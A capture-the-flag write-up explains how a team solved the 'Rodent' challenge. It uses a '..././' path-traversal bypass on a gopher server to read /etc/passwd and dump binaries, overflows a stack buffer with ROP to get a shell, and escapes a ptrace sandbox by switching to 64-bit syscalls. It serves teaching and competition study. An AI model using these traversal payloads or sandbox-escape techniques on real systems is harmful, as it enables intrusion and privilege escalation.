# Rodent - Pwn 800 problem

## Overview

Rodent was a multi-part challenge. The first part was a simple gopher
server, and the second involved escaping a ptrace sandbox.

To start with, all we were given was the IP/port of the gopher server.

## Dumping the binary

Our first goal was to dump the binary for the gopher server. Connecting
and sending `..`, we see what looks like the gopher binary (as well as a
flag file) in the directory listing:

```
$ nc -v 54.178.144.54 7777
Connection to 54.178.144.54 7777 port [tcp/*] succeeded!
..
i*****************************          (fake)  1
i*     Welcome to rodent     *          (fake)  1
i*                           *          (fake)  1
i*   Now with experimental   *          (fake)  1
i*         features!         *          (fake)  1
i*****************************          (fake)  1
9rodent /../rodent      rodent.codegate.int     7777
1.      /../.   rodent.codegate.int     7777
9.bash_logout   /../.bash_logout        rodent.codegate.int     7777
1data   /../data        rodent.codegate.int     7777
9.bash_history  /../.bash_history       rodent.codegate.int     7777
9.profile       /../.profile    rodent.codegate.int     7777
9flag   /../flag        rodent.codegate.int     7777
1..     /../..  rodent.codegate.int     7777
9.bashrc        /../.bashrc     rodent.codegate.int     7777
```

However, trying to download the files showed that path traversal seemed blocked
(plus file paths containing "flag" were specially filtered):

```
$ nc -v 54.178.144.54 7777
Connection to 54.178.144.54 7777 port [tcp/*] succeeded!
../flag
3*** No key for you *** /flag   error.host      1

$ nc -v 54.178.144.54 7777
Connection to 54.178.144.54 7777 port [tcp/*] succeeded!
../../../etc/passwd
3*** Could not resolve path *** /etc/passwd     error.host      1
```

Since `../../../../etc/passwd` was seemingly rewritten to `/etc/passwd`, we
decided to check the program was naively replacing `../` with the empty string.
This turned out to be exactly the case.

```
$ nc -v 54.178.144.54 7777
Connection to 54.178.144.54 7777 port [tcp/*] succeeded!
..././..././..././etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Using this trick, we dumped the binary as well as the libc. Since we can also
dump `/proc/self/maps`, we also get the libc base address for free when we
exploit the binary.

## Getting a shell

Reversing the binary, we found a pretty obvious buffer overflow. The gopher
server implements a special extension, where if a tab is sent, it reads some
additional data into a stack buffer. The code looked something like this:

```c
char *tab = strchr(ptr, '\t');
if (tab) {
  char *data = tab + 1;
  int len = atoi(data);
  if ((unsigned int) len > 0x1FF)
    send_err(fd, s, "Too much extra data");
  size_t after_line_length = buf + buf_len - line_end;
  if (len < (signed int) after_line_length)
    after_line_length = len;
  memcpy(stack_buf, src, n);
  recv(fd, &stack_buf[after_line_length], len - after_line_length - 1, 0);
  ...
}
```

If `len` is 0, then, then `after_line_length` is also set to 0, and the program will run:

```c
recv(fd, stack_buf, -1, 0);
```

The program has no canary, and we have the libc base, so it is simple to ROP to
`recv`/`system` and get a shell:

```
$ cat /home/rodent/flag
for the next stage, see /home/sandbucket
```

## Sandbucket

In `/home/sandbucket`, we see another setuid binary (32 bit), which we download
and reverse. The binary reads some shellcode from the user and runs it under a
ptrace sandbox which blocks the following syscalls (and allows anything else):

* fork
* vfork
* clone
* execve
* open
* read
* write
* creat
* socketcall

Additionally, the binary creates an empty directory in `/home/sandbucket/jails`
based on the hash of the shellcode, then chroots into that that directory. The
binary also closes all non-tty file descriptors to prevent escaping the chroot
via an inherited directory file descriptor.

### Bugs

There are two main issues with the implementation of the sandbox.

First, when the ptrace sandbox checks syscall numbers, it assumes 32 bit
syscalls. By doing a far return to a `cs` of 0x33, we can switch our process to
64 bit mode and use 64 bit syscalls:

```nasm
  push 0x33
  call getpc
getpc:
  add dword [esp], 5
  retf
```

Since 64 bit syscall numbers are different from 32 bit ones, this allows us to
call otherwise blacklisted system calls.

Second, the directory which the program chroots into is writable by the user
running the sandboxed code (even worse, `/home/sandbucket/jails` is
world-writable).

### Escaping

The 64 bit syscall number for clone is 0x38, which does not match any of the
the syscall numbers in the blacklist. We switch to 64-bit mode and call
`clone(CLONE_UNTRACED, NULL, NULL, NULL)` to create a process which is not
watched by the ptrace sandbox. From here, the simplest solution would be to
write a setuid binary into the chroot directory, then run it as the `rodent`
user to get a shell as `sandbucket`. However, we didn't think of this and
ended up doing something a litle more convoluted instead:

We wrote a small UNIX socket client/server, and placed the server inside the
chroot directory. As the `sandbucket` user, we executed the server, which
created a UNIX socket inside the chroot directory. Then as the `rodent` user,
we ran the client, which connected to the socket and sent a directory file
descriptor for / to the server using ancillary data. Finally, the server used
`openat` to open the flag file and print it out.

```
gophers_in_the_sandbox
```
